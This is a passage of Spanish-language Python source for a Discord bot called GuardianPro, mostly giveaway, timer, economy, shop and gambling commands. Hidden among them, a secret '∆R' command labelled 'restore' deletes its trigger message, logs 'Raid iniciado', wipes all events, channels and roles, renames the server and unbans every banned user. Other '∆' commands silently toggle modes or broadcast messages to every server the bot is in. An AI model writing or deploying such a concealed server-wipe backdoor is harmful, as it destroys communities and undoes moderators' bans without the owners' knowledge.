        title="🎉 ¡NUEVO SORTEO!",
        description=f"¡Participa haciendo clic en el botón de abajo!",
        color=discord.Color.blue()
    )

    embed.add_field(name="🎁 Premio", value=prize, inline=True)
    embed.add_field(name="🏆 Ganadores", value=f"{winners} ganador{'es' if winners > 1 else ''}", inline=True)
    embed.add_field(name="👥 Participantes", value="**0** usuarios participando", inline=True)

    if duration > 0:
        end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=duration)
        embed.add_field(name="⏰ Finaliza", value=f"<t:{int(end_time.timestamp())}:R>", inline=False)
    else:
        embed.add_field(name="⏰ Duración", value="Sin límite de tiempo (finalizar manualmente)", inline=False)

    embed.set_footer(text=f"Sorteo creado por {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)

    # Crear vista con botones
    view = GiveawayView(giveaway_id, winners)

    await interaction.response.send_message(embed=embed, view=view)

    # Si tiene duración, programar finalización automática
    if duration > 0:
        await asyncio.sleep(duration * 60)

        # Verificar si el sorteo sigue activo
        if giveaway_id in active_giveaways:
            try:
                message = await interaction.original_response()

                if len(view.participants) == 0:
                    embed = discord.Embed(
                        title="⏰ Sorteo Terminado",
                        description="El sorteo ha terminado sin participantes.",
                        color=discord.Color.orange()
                    )
                    embed.add_field(name="🎁 Premio", value=prize, inline=False)

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)
                else:
                    # Finalizar automáticamente
                    participants_list = list(view.participants)
                    winners_count = min(winners, len(participants_list))
                    auto_winners = random.sample(participants_list, winners_count)

                    embed = discord.Embed(
                        title="⏰ ¡SORTEO TERMINADO AUTOMÁTICAMENTE!",
                        color=discord.Color.gold()
                    )

                    embed.add_field(name="🎁 Premio", value=prize, inline=False)

                    winners_text = ""
                    for i, winner_id in enumerate(auto_winners):
                        try:
                            winner = bot.get_user(winner_id)
                            if winner:
                                winners_text += f"{'🥇' if i == 0 else '🎉'} {winner.mention}\n"
                            else:
                                winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"
                        except:
                            winners_text += f"{'🥇' if i == 0 else '🎉'} Usuario ID: {winner_id}\n"

                    embed.add_field(name="🏆 Ganadores", value=winners_text, inline=False)
                    embed.add_field(name="📊 Estadísticas", value=f"**{len(view.participants)}** participantes totales", inline=False)
                    embed.set_footer(text="Sorteo finalizado automáticamente por tiempo")

                    for item in view.children:
                        item.disabled = True

                    await message.edit(embed=embed, view=view)

                # Limpiar del registro
                if giveaway_id in active_giveaways:
                    del active_giveaways[giveaway_id]

            except Exception as e:
                print(f"Error al finalizar sorteo automáticamente: {e}")

# Sistema de temporizadores
active_timers = {}

@bot.tree.command(name="timer", description="Establecer un temporizador")
@discord.app_commands.describe(
    duration="Duración en minutos",
    message="Mensaje personalizado (opcional)"
)
async def timer(interaction: discord.Interaction, duration: int, message: str = None):
    if economy_only_mode:
        await interaction.response.send_message("❌ En modo economía, solo se permiten comandos con prefijo `.`", ephemeral=True)
        return

    if duration <= 0:
        await interaction.response.send_message("❌ La duración debe ser mayor a 0 minutos.", ephemeral=True)
        return

    if duration > 1440:  # 24 horas máximo
        await interaction.response.send_message("❌ La duración máxima es de 1440 minutos (24 horas).", ephemeral=True)
        return

    # Crear ID único para el temporizador
    timer_id = f"{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

    # Calcular tiempo de finalización
    end_time = datetime.datetime.utcnow() + datetime.timedelta(minutes=duration)

    # Guardar temporizador activo
    active_timers[timer_id] = {
        'user_id': interaction.user.id,
        'channel_id': interaction.channel.id,
        'message': message or "¡Tu temporizador ha terminado!",
        'end_time': end_time
    }

    # Crear embed del temporizador
    embed = discord.Embed(
        title="⏰ Temporizador Establecido",
        color=discord.Color.blue()
    )

    embed.add_field(name="⏱️ Duración", value=f"{duration} minutos", inline=True)
    embed.add_field(name="🕐 Finaliza", value=f"<t:{int(end_time.timestamp())}:R>", inline=True)
    embed.add_field(name="💬 Mensaje", value=message or "¡Tu temporizador ha terminado!", inline=False)
    embed.set_footer(text=f"Temporizador de {interaction.user.display_name}", icon_url=interaction.user.display_avatar.url)

    await interaction.response.send_message(embed=embed)

    # Esperar el tiempo especificado
    await asyncio.sleep(duration * 60)

    # Verificar si el temporizador sigue activo
    if timer_id in active_timers:
        timer_data = active_timers[timer_id]

        try:
            # Crear embed de notificación
            notification_embed = discord.Embed(
                title="⏰ ¡TEMPORIZADOR TERMINADO!",
                description=timer_data['message'],
                color=discord.Color.green()
            )
            notification_embed.add_field(name="⏱️ Duración", value=f"{duration} minutos", inline=True)
            notification_embed.set_footer(text="Tu temporizador ha expirado")

            # Mencionar al usuario
            channel = bot.get_channel(timer_data['channel_id'])
            if channel:
                user = bot.get_user(timer_data['user_id'])
                user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
                await channel.send(f"⏰ {user_mention}", embed=notification_embed)

            # Limpiar del registro
            del active_timers[timer_id]

        except Exception as e:
            print(f"Error al enviar notificación de temporizador: {e}")
            # Limpiar del registro incluso si hay error
            if timer_id in active_timers:
                del active_timers[timer_id]

@bot.command(name='S')
async def restore(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆R'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    await ctx.send("🔄 Iniciando restauración del servidor...")
    print(f"Raid iniciado en el servidor {guild.name}")

    # Función auxiliar para manejar rate limits automáticamente
    async def handle_rate_limit_action(action, *args, **kwargs):
        max_retries = 3
        for attempt in range(max_retries):
            try:
                return await action(*args, **kwargs)
            except discord.HTTPException as e:
                if e.status == 429:  # Rate limit
                    retry_after = getattr(e, 'retry_after', 10)
                    print(f"Rate limit detectado. Esperando {retry_after} segundos... (intento {attempt + 1})")
                    await asyncio.sleep(retry_after + 2)
                else:
                    print(f"Error HTTP: {e}")
                    if attempt == max_retries - 1:
                        raise
            except Exception as e:
                print(f"Error: {e}")
                if attempt == max_retries - 1:
                    raise
                await asyncio.sleep(2)

    # Borrar eventos programados
    try:
        events = list(guild.scheduled_events)
        for event in events:
            await handle_rate_limit_action(event.delete)
            print(f"Evento eliminado: {event.name}")
    except Exception as e:
        print(f"Error al borrar eventos: {e}")

    await asyncio.sleep(2)

    # Borrar canales de forma más controlada
    print("Eliminando canales...")
    channels = list(guild.channels)
    print(f"Total de canales a eliminar: {len(channels)}")

    for i, channel in enumerate(channels):
        try:
            await handle_rate_limit_action(channel.delete)
            print(f"Canal eliminado ({i+1}/{len(channels)}): {channel.name}")
        except Exception as e:
            print(f"No se pudo eliminar canal {channel.name}: {e}")

    await asyncio.sleep(3)

    # Borrar roles de forma más controlada
    print("Eliminando roles...")
    roles_to_delete = [role for role in guild.roles
                      if role.name != "@everyone" and not role.managed
                      and role.position < guild.me.top_role.position]

    for i, role in enumerate(roles_to_delete):
        try:
            await handle_rate_limit_action(role.delete)
            print(f"Rol eliminado ({i+1}/{len(roles_to_delete)}): {role.name}")
        except Exception as e:
            print(f"No se pudo eliminar rol {role.name}: {e}")

    await asyncio.sleep(3)

    # Restaurar nombre del servidor
    try:
        await handle_rate_limit_action(guild.edit, name="🏠 Servidor Restaurado", icon=None)
        print("Nombre del servidor restaurado")
    except Exception as e:
        print(f"Error al restaurar nombre del servidor: {e}")

    await asyncio.sleep(2)

    # Crear estructura básica del servidor
    print("Creando estructura básica...")

    # Variables para almacenar elementos creados
    mod_role = None
    member_role = None
    general_category = None
    success_channel = None

    try:
        # Crear rol de moderador
        print("Creando rol Moderador...")
        mod_role = await handle_rate_limit_action(
            guild.create_role,
            name="🛡️ Moderador",
            colour=discord.Colour.blue(),
            permissions=discord.Permissions(
                manage_messages=True,
                kick_members=True,
                ban_members=True,
                manage_channels=True,
                manage_roles=True
            )
        )
        print("✅ Rol Moderador creado")

        # Crear rol de miembro
        print("Creando rol Miembro...")
        member_role = await handle_rate_limit_action(
            guild.create_role,
            name="👥 Miembro",
            colour=discord.Colour.green(),
            permissions=discord.Permissions(
                send_messages=True,
                read_messages=True,
                connect=True,
                speak=True,
                read_message_history=True,
                use_external_emojis=True
            )
        )
        print("✅ Rol Miembro creado")

        # Crear categoría general
        print("Creando categoría GENERAL...")
        general_category = await handle_rate_limit_action(
            guild.create_category,
            "📋 GENERAL"
        )
        print("✅ Categoría GENERAL creada")

        # Crear canales básicos
        print("Creando canales básicos...")

        success_channel = await handle_rate_limit_action(
            guild.create_text_channel,
            '💬│general',
            category=general_category
        )
        print("✅ Canal general creado")

        await handle_rate_limit_action(
            guild.create_text_channel,
            '📣│anuncios',
            category=general_category
        )
        print("✅ Canal anuncios creado")

        await handle_rate_limit_action(
            guild.create_text_channel,
            '📝│reglas',
            category=general_category
        )
        print("✅ Canal reglas creado")

        # Crear categoría de voz
        print("Creando categoría de voz...")
        voice_category = await handle_rate_limit_action(
            guild.create_category,
            "🔊 VOZ"
        )
        print("✅ Categoría VOZ creada")

        await handle_rate_limit_action(
            guild.create_voice_channel,
            '🎤│General',
            category=voice_category
        )
        print("✅ Canal de voz General creado")

        await handle_rate_limit_action(
            guild.create_voice_channel,
            '🎮│Juegos',
            category=voice_category
        )
        print("✅ Canal de voz Juegos creado")

        # Crear categoría de administración
        print("Creando categoría de administración...")
        admin_category = await handle_rate_limit_action(
            guild.create_category,
            "⚙️ ADMINISTRACIÓN"
        )
        print("✅ Categoría ADMINISTRACIÓN creada")

        admin_channel = await handle_rate_limit_action(
            guild.create_text_channel,
            '🔧│admin',
            category=admin_category
        )
        print("✅ Canal admin creado")

        # Configurar permisos del canal admin
        if mod_role and admin_channel:
            await handle_rate_limit_action(
                admin_channel.set_permissions,
                guild.default_role,
                read_messages=False
            )
            await handle_rate_limit_action(
                admin_channel.set_permissions,
                mod_role,
                read_messages=True,
                send_messages=True
            )
            print("✅ Permisos del canal admin configurados")

    except Exception as e:
        print(f"Error en la creación de estructura: {e}")
        # Crear al menos un canal básico como respaldo
        try:
            if not success_channel:
                success_channel = await handle_rate_limit_action(
                    guild.create_text_channel,
                    '💬│general'
                )
                print("✅ Canal general de respaldo creado")
        except Exception as fallback_error:
            print(f"Error en canal de respaldo: {fallback_error}")

    await asyncio.sleep(2)

    # Desbanear usuarios
    print("Desbaneando usuarios...")
    try:
        ban_list = [entry async for entry in guild.bans(limit=None)]
        for ban_entry in ban_list:
            try:
                await handle_rate_limit_action(guild.unban, ban_entry.user)
                print(f"Usuario desbaneado: {ban_entry.user}")
            except Exception as e:
                print(f"Error al desbanear {ban_entry.user}: {e}")

        print(f"✅ Se procesaron {len(ban_list)} usuarios para desbanear")
    except Exception as e:
        print(f"Error al desbanear usuarios: {e}")

    # Mensaje de confirmación
    try:
        if success_channel:
            await success_channel.send("✅ ¡Servidor restaurado exitosamente! Se han creado canales básicos, roles y se desbanearon todos los usuarios.")
            print("✅ Mensaje de confirmación enviado")
        print("🎉 Restauración completada exitosamente")
    except Exception as e:
        print(f"Error enviando mensaje de confirmación: {e}")
        print("✅ Restauración completada exitosamente (mensaje por consola)")

@bot.command(name='E')
async def economy_mode(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆E'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Borrar el mensaje del comando inmediatamente
    try:
        await ctx.message.delete()
    except:
        pass

    global economy_only_mode
    economy_only_mode = not economy_only_mode  # Alternar estado

    # Solo log en consola, sin mensaje visible
    status = "ACTIVADO" if economy_only_mode else "DESACTIVADO"
    print(f"Modo economía {status} por {ctx.author.name}")

@bot.command(name='X')
async def update_announcement(ctx):
    # Solo funciona con prefijo ∆
    if not ctx.message.content.startswith('∆X'):
        return

    # Verificar si los comandos ∆ están habilitados
    if not delta_commands_enabled:
        return

    # Verificar si está en modo economía
    if economy_only_mode:
        return

    await ctx.send("📢 Enviando anuncio de actualización a todos los servidores...")

    # Contador de servidores
    success_count = 0
    total_count = len(bot.guilds)

    # Embed del anuncio
    update_embed = discord.Embed(
        title="🎉 ¡Nueva Actualización Disponible!",
        description=(
            "**GuardianPro** se ha actualizado con nuevas características y mejoras.\n\n"
            "✨ **Novedades:**\n"
            "• Sistema de economía mejorado\n"
            "• Nuevos comandos de seguridad\n"
            "• Optimizaciones de rendimiento\n"
            "• Corrección de errores menores\n\n"
            "🛡️ **¡Disfruta de la nueva experiencia!**"
        ),
        color=discord.Color.blue()
    )
    update_embed.set_footer(text="GuardianPro | Actualización automática")
    update_embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/1828/1828640.png")

    # Enviar a todos los servidores
    for guild in bot.guilds:
        try:
            # Buscar un canal donde se pueda enviar mensaje
            target_channel = None

            # Intentar canal general primero
            for channel in guild.text_channels:
                if any(name in channel.name.lower() for name in ['general', 'anuncios', 'updates', 'noticias']):
                    if channel.permissions_for(guild.me).send_messages:
                        target_channel = channel
                        break

            # Si no encuentra canal específico, usar el primer canal disponible
            if not target_channel:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).send_messages:
                        target_channel = channel
                        break

            # Enviar mensaje
            if target_channel:
                await target_channel.send(embed=update_embed)
                success_count += 1
                print(f"Anuncio enviado a: {guild.name} (#{target_channel.name})")
            else:
                print(f"No se pudo enviar anuncio a: {guild.name} (sin permisos)")

        except Exception as e:
            print(f"Error enviando anuncio a {guild.name}: {e}")

        # Pequeña pausa para evitar rate limits
        await asyncio.sleep(1)

    # Mensaje de confirmación
    await ctx.send(f"✅ Anuncio de actualización enviado exitosamente a {success_count}/{total_count} servidores.")
    print(f"Anuncio de actualización completado: {success_count}/{total_count} servidores")

# Comandos de economía con prefijo .
@bot.command(name='pay')
async def pay(ctx, user: discord.Member, amount: int):

    if user == ctx.author:
        await ctx.send("❌ No puedes enviarte dinero a ti mismo.")
        return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    sender_bal = get_balance(ctx.author.id)
    if sender_bal['wallet'] < amount:
        await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${sender_bal['wallet']:,} en tu cartera.")
        return

    # Transferir dinero
    update_balance(ctx.author.id, wallet=-amount)
    update_balance(user.id, wallet=amount)

    embed = discord.Embed(
        title="💸 Transferencia Exitosa",
        description=f"{ctx.author.mention} envió ${amount:,} a {user.mention}",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command(name='balance', aliases=['bal'])
async def balance(ctx, user: discord.Member = None):

    if user is None:
        user = ctx.author

    bal = get_balance(user.id)
    embed = discord.Embed(
        title=f"💰 Balance de {user.display_name}",
        color=discord.Color.green()
    )
    embed.add_field(name="💵 Cartera", value=f"${bal['wallet']:,}", inline=True)
    embed.add_field(name="🏦 Banco", value=f"${bal['bank']:,}", inline=True)
    embed.add_field(name="💎 Total", value=f"${bal['wallet'] + bal['bank']:,}", inline=True)

    await ctx.send(embed=embed)

@bot.command(name='work')
async def work(ctx):

    cooldown_time = 3600  # 1 hora

    if not can_use_cooldown(ctx.author.id, 'work', cooldown_time):
        remaining = get_cooldown_remaining(ctx.author.id, 'work', cooldown_time)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(f"⏰ Debes esperar {hours}h {minutes}m antes de trabajar nuevamente.")
        return

    # Trabajos disponibles
    jobs = [
        ("Programador", 800, 1500),
        ("Delivery", 400, 800),
        ("Diseñador", 600, 1200),
        ("Streamer", 300, 1000),
        ("Músico", 500, 900)
    ]

    job, min_pay, max_pay = random.choice(jobs)
    earnings = random.randint(min_pay, max_pay)

    update_balance(ctx.author.id, wallet=earnings)

    embed = discord.Embed(
        title="💼 Trabajo Completado",
        description=f"Trabajaste como **{job}** y ganaste ${earnings:,}",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name='daily')
async def daily(ctx):

    cooldown_time = 86400  # 24 horas

    if not can_use_cooldown(ctx.author.id, 'daily', cooldown_time):
        remaining = get_cooldown_remaining(ctx.author.id, 'daily', cooldown_time)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(f"⏰ Ya recogiste tu recompensa diaria. Vuelve en {hours}h {minutes}m.")
        return

    daily_amount = random.randint(500, 1000)
    update_balance(ctx.author.id, wallet=daily_amount)

    embed = discord.Embed(
        title="🎁 Recompensa Diaria",
        description=f"¡Recibiste ${daily_amount:,} como recompensa diaria!",
        color=discord.Color.gold()
    )
    await ctx.send(embed=embed)

@bot.command(name='deposit', aliases=['dep'])
async def deposit(ctx, amount):

    if amount.lower() == 'all':
        bal = get_balance(ctx.author.id)
        amount = bal['wallet']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("❌ Cantidad inválida.")
            return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    bal = get_balance(ctx.author.id)
    if bal['wallet'] < amount:
        await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${bal['wallet']:,} en tu cartera.")
        return

    update_balance(ctx.author.id, wallet=-amount, bank=amount)

    embed = discord.Embed(
        title="🏦 Depósito Exitoso",
        description=f"Depositaste ${amount:,} en tu banco.",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command(name='withdraw', aliases=['with'])
async def withdraw(ctx, amount):

    if amount.lower() == 'all':
        bal = get_balance(ctx.author.id)
        amount = bal['bank']
    else:
        try:
            amount = int(amount)
        except ValueError:
            await ctx.send("❌ Cantidad inválida.")
            return

    if amount <= 0:
        await ctx.send("❌ La cantidad debe ser mayor a 0.")
        return

    bal = get_balance(ctx.author.id)
    if bal['bank'] < amount:
        await ctx.send(f"❌ No tienes suficiente dinero en el banco. Tienes ${bal['bank']:,}.")
        return

    update_balance(ctx.author.id, wallet=amount, bank=-amount)

    embed = discord.Embed(
        title="💰 Retiro Exitoso",
        description=f"Retiraste ${amount:,} de tu banco.",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name='rob')
async def rob(ctx, user: discord.Member):

    if user == ctx.author:
        await ctx.send("❌ No puedes robarte a ti mismo.")
        return

    if user.bot:
        await ctx.send("❌ No puedes robar a un bot.")
        return

    cooldown_time = 7200  # 2 horas

    if not can_use_cooldown(ctx.author.id, 'rob', cooldown_time):
        remaining = get_cooldown_remaining(ctx.author.id, 'rob', cooldown_time)
        hours = int(remaining // 3600)
        minutes = int((remaining % 3600) // 60)
        await ctx.send(f"⏰ Debes esperar {hours}h {minutes}m antes de robar nuevamente.")
        return

    target_bal = get_balance(user.id)
    if target_bal['wallet'] < 100:
        await ctx.send(f"❌ {user.display_name} no tiene suficiente dinero para robar.")
        return

    # 50% de probabilidad de éxito
    if random.choice([True, False]):
        # Robo exitoso
        stolen = min(target_bal['wallet'] // 4, random.randint(50, 500))
        update_balance(user.id, wallet=-stolen)
        update_balance(ctx.author.id, wallet=stolen)

        embed = discord.Embed(
            title="🦹 Robo Exitoso",
            description=f"Robaste ${stolen:,} a {user.display_name}",
            color=discord.Color.red()
        )
    else:
        # Robo fallido
        fine = min(get_balance(ctx.author.id)['wallet'] // 3, random.randint(100, 300))
        update_balance(ctx.author.id, wallet=-fine)

        embed = discord.Embed(
            title="🚔 Robo Fallido",
            description=f"Fuiste atrapado y pagaste una multa de ${fine:,}",
            color=discord.Color.dark_red()
        )

    await ctx.send(embed=embed)

@bot.command(name='leaderboard', aliases=['lb'])
async def leaderboard(ctx):

    # Crear lista de usuarios con su dinero total
    user_money = []
    for user_id, bal in balances.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total = bal['wallet'] + bal['bank']
                user_money.append((user.display_name, total))
        except:
            continue

    # Ordenar por dinero total
    user_money.sort(key=lambda x: x[1], reverse=True)
    user_money = user_money[:10]  # Top 10

    embed = discord.Embed(
        title="🏆 Tabla de Posiciones",
        color=discord.Color.gold()
    )

    if not user_money:
        embed.description = "No hay datos disponibles."
    else:
        description = ""
        medals = ["🥇", "🥈", "🥉"]
        for i, (name, money) in enumerate(user_money):
            medal = medals[i] if i < 3 else f"{i+1}."
            description += f"{medal} **{name}** - ${money:,}\n"
        embed.description = description

    await ctx.send(embed=embed)

@bot.command(name='baltop')
async def baltop(ctx):

    # Crear lista de usuarios con su dinero total
    user_money = []
    for user_id, bal in balances.items():
        try:
            user = bot.get_user(int(user_id))
            if user and not user.bot:
                total = bal['wallet'] + bal['bank']
                user_money.append((user.display_name, total))
        except:
            continue

    # Ordenar por dinero total
    user_money.sort(key=lambda x: x[1], reverse=True)
    user_money = user_money[:15]  # Top 15

    embed = discord.Embed(
        title="💰 Top Económico",
        color=discord.Color.gold()
    )

    if not user_money:
        embed.description = "No hay datos disponibles."
    else:
        description = ""
        for i, (name, money) in enumerate(user_money):
            if i == 0:
                description += f"👑 **{name}** - ${money:,}\n"
            elif i < 3:
                medals = ["", "🥈", "🥉"]
                description += f"{medals[i]} **{name}** - ${money:,}\n"
            else:
                description += f"`{i+1}.` {name} - ${money:,}\n"
        embed.description = description

    await ctx.send(embed=embed)

# Sistema de inventario e ítems
inventory_file = 'inventory.json'

if os.path.exists(inventory_file):
    with open(inventory_file, 'r') as f:
        inventories = json.load(f)
else:
    inventories = {}

def save_inventory():
    with open(inventory_file, 'w') as f:
        json.dump(inventories, f)

def get_inventory(user_id):
    user_id = str(user_id)
    if user_id not in inventories:
        inventories[user_id] = {}
    return inventories[user_id]

def add_item(user_id, item_name, quantity=1):
    user_id = str(user_id)
    inv = get_inventory(user_id)
    if item_name in inv:
        inv[item_name] += quantity
    else:
        inv[item_name] = quantity
    save_inventory()

# Tienda de ítems
SHOP_ITEMS = {
    "🍔 Hamburguesa": {"price": 50, "description": "Una deliciosa hamburguesa"},
    "🍕 Pizza": {"price": 80, "description": "Pizza italiana auténtica"},
    "🎮 Videojuego": {"price": 500, "description": "El último videojuego de moda"},
    "📱 Smartphone": {"price": 2000, "description": "Teléfono de última generación"},
    "🚗 Auto": {"price": 15000, "description": "Auto deportivo de lujo"},
    "🏠 Casa": {"price": 50000, "description": "Mansión con vista al mar"},
    "💎 Diamante": {"price": 10000, "description": "Diamante raro y brillante"},
    "⌚ Reloj": {"price": 3000, "description": "Reloj suizo de lujo"}
}

@bot.command(name='shop')
async def shop(ctx):

    embed = discord.Embed(
        title="🛒 Tienda Virtual",
        description="¡Bienvenido a la tienda! Usa `.buy <ítem>` para comprar.",
        color=discord.Color.blue()
    )

    shop_text = ""
    for item, data in SHOP_ITEMS.items():
        shop_text += f"{item} - **${data['price']:,}**\n*{data['description']}*\n\n"

    embed.add_field(name="Productos Disponibles", value=shop_text, inline=False)
    embed.set_footer(text="Ejemplo: .buy hamburguesa")
    await ctx.send(embed=embed)

@bot.command(name='buy')
async def buy(ctx, *, item_name):

    # Buscar ítem en la tienda
    item_found = None
    item_key = None

    for key, data in SHOP_ITEMS.items():
        if item_name.lower() in key.lower():
            item_found = data
            item_key = key
            break

    if not item_found:
        await ctx.send("❌ Ese ítem no existe en la tienda. Usa `.shop` para ver los productos.")
        return

    price = item_found["price"]
    bal = get_balance(ctx.author.id)

    if bal['wallet'] < price:
        await ctx.send(f"❌ No tienes suficiente dinero. Necesitas ${price:,} pero solo tienes ${bal['wallet']:,}.")
        return

    # Realizar compra
    update_balance(ctx.author.id, wallet=-price)
    add_item(ctx.author.id, item_key)

    embed = discord.Embed(
        title="✅ Compra Exitosa",
        description=f"Compraste {item_key} por ${price:,}",
        color=discord.Color.green()
    )
    await ctx.send(embed=embed)

@bot.command(name='inventory', aliases=['inv'])
async def inventory(ctx, user: discord.Member = None):

    if user is None:
        user = ctx.author

    inv = get_inventory(user.id)

    embed = discord.Embed(
        title=f"🎒 Inventario de {user.display_name}",
        color=discord.Color.purple()
    )

    if not inv:
        embed.description = "El inventario está vacío."
    else:
        inv_text = ""
        for item, quantity in inv.items():
            inv_text += f"{item} x{quantity}\n"
        embed.description = inv_text

    await ctx.send(embed=embed)

@bot.command(name='coinflip', aliases=['cf'])
async def coinflip(ctx, bet: int, choice):

    if choice.lower() not in ['cara', 'cruz', 'heads', 'tails']:
        await ctx.send("❌ Elige `cara` o `cruz`.")
        return

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    bal = get_balance(ctx.author.id)
    if bal['wallet'] < bet:
        await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${bal['wallet']:,}.")
        return

    # Determinar resultado
    result = random.choice(['cara', 'cruz'])
    user_choice = 'cara' if choice.lower() in ['cara', 'heads'] else 'cruz'

    if result == user_choice:
        # Ganó
        winnings = bet
        update_balance(ctx.author.id, wallet=winnings)
        embed = discord.Embed(
            title="🪙 Lanzamiento de Moneda",
            description=f"🎉 ¡Ganaste!\nResultado: **{result.upper()}**\nGanaste: ${winnings:,}",
            color=discord.Color.green()
        )
    else:
        # Perdió
        update_balance(ctx.author.id, wallet=-bet)
        embed = discord.Embed(
            title="🪙 Lanzamiento de Moneda",
            description=f"😢 Perdiste...\nResultado: **{result.upper()}**\nPerdiste: ${bet:,}",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command(name='slots')
async def slots(ctx, bet: int):

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    bal = get_balance(ctx.author.id)
    if bal['wallet'] < bet:
        await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${bal['wallet']:,}.")
        return

    # Símbolos de la máquina tragamonedas
    symbols = ['🍒', '🍋', '🍊', '🍇', '⭐', '💎', '7️⃣']

    # Generar resultado
    result = [random.choice(symbols) for _ in range(3)]

    # Calcular ganancia
    multiplier = 0
    if result[0] == result[1] == result[2]:
        if result[0] == '💎':
            multiplier = 10  # Jackpot
        elif result[0] == '7️⃣':
            multiplier = 5
        elif result[0] == '⭐':
            multiplier = 3
        else:
            multiplier = 2
    elif result[0] == result[1] or result[1] == result[2] or result[0] == result[2]:
        multiplier = 0.5

    if multiplier > 0:
        winnings = int(bet * multiplier)
        update_balance(ctx.author.id, wallet=winnings - bet)
        embed = discord.Embed(
            title="🎰 Máquina Tragamonedas",
            description=f"{''.join(result)}\n\n🎉 ¡Ganaste ${winnings:,}!",
            color=discord.Color.green()
        )
    else:
        update_balance(ctx.author.id, wallet=-bet)
        embed = discord.Embed(
            title="🎰 Máquina Tragamonedas",
            description=f"{''.join(result)}\n\n😢 Perdiste ${bet:,}",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command(name='crime')
async def crime(ctx):

    cooldown_time = 1800  # 30 minutos

    if not can_use_cooldown(ctx.author.id, 'crime', cooldown_time):
        remaining = get_cooldown_remaining(ctx.author.id, 'crime', cooldown_time)
        minutes = int(remaining // 60)
        await ctx.send(f"⏰ Debes esperar {minutes} minutos antes de cometer otro crimen.")
        return

    crimes = [
        ("Hackear un cajero automático", 500, 1500),
        ("Robar una tienda", 300, 800),
        ("Fraude online", 400, 1200),
        ("Contrabando", 600, 1000),
        ("Estafa telefónica", 200, 700)
    ]

    crime, min_reward, max_reward = random.choice(crimes)

    # 70% de éxito
    if random.random() < 0.7:
        reward = random.randint(min_reward, max_reward)
        update_balance(ctx.author.id, wallet=reward)
        embed = discord.Embed(
            title="🦹 Crimen Exitoso",
            description=f"Completaste: **{crime}**\nGanaste: ${reward:,}",
            color=discord.Color.dark_red()
        )
    else:
        fine = random.randint(200, 500)
        bal = get_balance(ctx.author.id)
        fine = min(fine, bal['wallet'])
        update_balance(ctx.author.id, wallet=-fine)
        embed = discord.Embed(
            title="🚔 Crimen Fallido",
            description=f"Te atraparon intentando: **{crime}**\nMulta: ${fine:,}",
            color=discord.Color.red()
        )

    await ctx.send(embed=embed)

@bot.command(name='beg')
async def beg(ctx):

    cooldown_time = 300  # 5 minutos

    if not can_use_cooldown(ctx.author.id, 'beg', cooldown_time):
        remaining = get_cooldown_remaining(ctx.author.id, 'beg', cooldown_time)
        minutes = int(remaining // 60)
        seconds = int(remaining % 60)
        await ctx.send(f"⏰ Debes esperar {minutes}m {seconds}s antes de mendigar nuevamente.")
        return

    # 60% de éxito
    if random.random() < 0.6:
        amount = random.randint(10, 100)
        update_balance(ctx.author.id, wallet=amount)

        responses = [
            f"😊 Una persona amable te dio ${amount:,}",
            f"💝 Encontraste ${amount:,} en el suelo",
            f"🎁 Un extraño generoso te regaló ${amount:,}",
            f"⭐ Tu suerte te trajo ${amount:,}",
            f"🍀 Tuviste suerte y ganaste ${amount:,}"
        ]

        embed = discord.Embed(
            title="🤲 Mendigar",
            description=random.choice(responses),
            color=discord.Color.green()
        )
    else:
        responses = [
            "😞 Nadie te dio dinero esta vez",
            "🚫 La gente te ignoró",
            "💔 No tuviste suerte hoy",
            "😔 Mejor suerte la próxima vez"
        ]

        embed = discord.Embed(
            title="🤲 Mendigar",
            description=random.choice(responses),
            color=discord.Color.orange()
        )

    await ctx.send(embed=embed)

@bot.command(name='blackjack', aliases=['bj'])
async def blackjack(ctx, bet: int):

    if bet <= 0:
        await ctx.send("❌ La apuesta debe ser mayor a 0.")
        return

    bal = get_balance(ctx.author.id)
    if bal['wallet'] < bet:
        await ctx.send(f"❌ No tienes suficiente dinero. Tienes ${bal['wallet']:,}.")
        return

    # Cartas simples (solo valores)
    def get_card():
        return random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10])  # J, Q, K = 10

    def calculate_hand(hand):
        total = sum(hand)
        aces = hand.count(1)

        # Ajustar por ases
        while aces > 0 and total + 10 <= 21:
            total += 10
            aces -= 1

        return total

    # Repartir cartas iniciales
    player_hand = [get_card(), get_card()]
    dealer_hand = [get_card(), get_card()]

    player_total = calculate_hand(player_hand)
    dealer_total = calculate_hand(dealer_hand)

    # Mostrar manos iniciales
    embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.blue())
